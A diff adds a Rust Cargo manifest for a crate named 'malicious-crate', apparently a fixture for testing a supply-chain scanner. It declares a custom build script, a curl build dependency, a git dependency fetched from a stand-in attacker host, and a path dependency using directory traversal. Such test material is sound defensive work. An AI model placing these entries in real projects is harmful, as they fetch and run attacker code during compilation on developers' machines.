@@ -1,0 +1,23 @@
+[package]
+name = "malicious-crate"
+version = "0.1.0"
+edition = "2021"
+build = "evil-build.rs"
+
+[dependencies]
+serde = "1.0"
+tokio = { version = "1.0", features = ["full"] }
+
+# Build dependencies allow code execution during compilation
+[build-dependencies]
+cc = "1.0"
+curl = "0.4"
+
+# Suspicious git dependency
+[dependencies.suspicious]
+git = "https://evil-git-server.com/malware/payload"
+branch = "main"
+
+# Path traversal attempt
+[dependencies.local-evil]
+path = "../../../system/malware"
